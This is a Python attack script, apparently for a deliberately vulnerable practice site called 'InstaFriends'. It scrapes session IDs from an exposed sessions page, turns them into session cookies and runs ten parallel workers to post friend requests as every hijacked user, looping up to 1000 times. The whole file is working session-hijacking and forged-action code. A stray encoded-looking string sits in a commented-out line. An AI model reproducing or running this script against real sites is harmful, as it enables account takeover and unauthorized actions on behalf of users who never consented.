import requests
from bs4 import BeautifulSoup
from multiprocessing import Pool


# Unique IP is the particular instance. It changes if you do a full reset.
UID = 13-57-228-131

# How many times do you want to run?
ITERATIONS = 1000

UID = str(UID)
URL_PREFIX = 'https://' + UID

# Targets.
ENTRY_URL = URL_PREFIX + '-social.vulnerablesites.net/InstaFriends/users/profile/1'
SESSIONS_URL = URL_PREFIX + '-social.vulnerablesites.net/InstaFriends/sessions'
INTERACT_URL_1 = URL_PREFIX + '-social.vulnerablesites.net/InstaFriends/home'
INTERACT_URL_2 = URL_PREFIX + '-social.vulnerablesites.net/InstaFriends/users/messages'
INTERACT_ADD_TOM_FRIEND = URL_PREFIX + '-social.vulnerablesites.net:443/InstaFriends/users/profile/1/friends/add'

COOKIE_NAME = 'instafriends_session_id'


class CookieMonster:
    def __init__(self,
                 entry_url=ENTRY_URL,
                 sessions_url=SESSIONS_URL,
                 cookie_name=COOKIE_NAME):

        self.entry_url = entry_url
        self.session_url = sessions_url
        self.cookie_name = cookie_name

        self._session_ids = []
        self.cookies = []

        self.session = None

    def get_session_ids(self):
        page = requests.get(self.session_url)
        soup = BeautifulSoup(page.text, "html.parser")

        print("Retrieving Session ids.")
        session_data = soup.find(class_='medium-6 columns').get_text()
        session_data = session_data.split("\n")

        for entry in session_data[2:]:
            tokens = entry.split(',')
            try:
                self._session_ids.append(tokens[1])
            except IndexError:
                ...

    def make_cookies(self):
        if len(self._session_ids):
            for _id in self._session_ids:
                _cookie = {self.cookie_name: self._session_ids.pop(0)}
                self.cookies.append(_cookie)

        else:
            print("No cookies made! No id's left in session.")
        print(f"Cookies were made.")

    def basic_interaction(self, cookie):

        self.session = requests.Session()
        # page = self.session.get(self.entry_url, cookies=cookie)iH1lit8xrNyGEkuSxyXyzPkLQqRZPv8X/2AKAiDWZFiUwBJ0

        print(f"Interacting with {cookie}...")

        self.session.post(INTERACT_ADD_TOM_FRIEND, cookies=cookie)


CM = CookieMonster(ENTRY_URL, SESSIONS_URL, COOKIE_NAME)


while ITERATIONS:
    CM.get_session_ids()
    CM.make_cookies()
    if len(CM.cookies):
        pool = Pool(10)
        _cookies = []
        for i in range(len(CM.cookies)):
            _cookies.append(CM.cookies.pop(0))

        pool.map(CM.basic_interaction, _cookies)

    ITERATIONS -= 1


